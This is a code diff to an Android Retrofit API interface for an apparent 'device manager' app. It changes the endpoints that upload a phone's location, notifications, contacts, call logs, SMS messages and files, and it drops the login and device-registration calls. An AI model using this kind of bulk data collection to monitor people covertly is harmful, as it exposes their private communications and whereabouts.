@@ -3,6 +3,7 @@ package com.devicemanager.data.remote
 import com.devicemanager.data.remote.model.*
 import okhttp3.MultipartBody
 import okhttp3.RequestBody
+import okhttp3.ResponseBody
 import retrofit2.Response
 import retrofit2.http.*
 
@@ -21,87 +22,68 @@ interface ApiService {
         @Body request: RegisterRequest
     ): Response<RegisterResponse>
 
-    @POST("/api/auth/login")
-    suspend fun login(
-        @Body request: LoginRequest
-    ): Response<LoginResponse>
-
-    @POST("/api/devices/register-device")
-    suspend fun registerDeviceToAccount(
-        @Header("Authorization") authHeader: String,
-        @Body request: RegisterDeviceRequest
-    ): Response<RegisterDeviceResponse>
-
     // ── Telemetry ────────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/telemetry")
+    @POST("/api/telemetry")
     suspend fun sendTelemetry(
-        @Path("id") deviceId: String,
         @Body request: TelemetryRequest
-    ): Response<TelemetryResponse>
+    ): Response<ResponseBody>
 
     // ── Location ─────────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/location")
+    @POST("/api/locations")
     suspend fun sendLocation(
-        @Path("id") deviceId: String,
         @Body request: LocationRequest
-    ): Response<LocationResponse>
+    ): Response<ResponseBody>
 
     // ── Notifications ────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/notifications")
+    @POST("/api/notifications")
     suspend fun sendNotification(
-        @Path("id") deviceId: String,
         @Body request: NotificationRequest
-    ): Response<NotificationResponse>
+    ): Response<ResponseBody>
 
     // ── Usage Stats ──────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/usage")
+    @POST("/api/usage")
     suspend fun sendUsageStats(
-        @Path("id") deviceId: String,
         @Body request: UsageRequest
-    ): Response<UsageResponse>
+    ): Response<ResponseBody>
 
     // ── Contacts ─────────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/contacts")
+    @POST("/api/contacts/sync")
     suspend fun syncContacts(
-        @Path("id") deviceId: String,
         @Body request: ContactsSyncRequest
-    ): Response<ContactsSyncResponse>
+    ): Response<ResponseBody>
 
     // ── Call Log ─────────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/calls")
+    @POST("/api/calls/sync")
     suspend fun syncCalls(
-        @Path("id") deviceId: String,
         @Body request: CallsSyncRequest
-    ): Response<CallsSyncResponse>
+    ): Response<ResponseBody>
 
     // ── SMS ──────────────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/sms")
+    @POST("/api/sms/sync")
     suspend fun syncSms(
-        @Path("id") deviceId: String,
         @Body request: SmsSyncRequest
-    ): Response<SmsSyncResponse>
+    ): Response<ResponseBody>
 
     // ── Files ────────────────────────────────────────────────────────
 
-    @POST("/api/devices/{id}/files")
+    @POST("/api/files/sync")
     suspend fun syncFiles(
-        @Path("id") deviceId: String,
         @Body request: FilesSyncRequest
-    ): Response<FilesSyncResponse>
+    ): Response<ResponseBody>
 
     // ── File Upload (multipart) ──────────────────────────────────────
 
     @Multipart
-    @POST("/api/devices/{id}/upload-file")
+    @POST("/api/upload")
     suspend fun uploadFile(
-        @Path("id") deviceId: String,
+        @Part("device_id") deviceId: RequestBody,
         @Part("file_type") fileType: RequestBody,
         @Part file: MultipartBody.Part
     ): Response<FileUploadResponse>
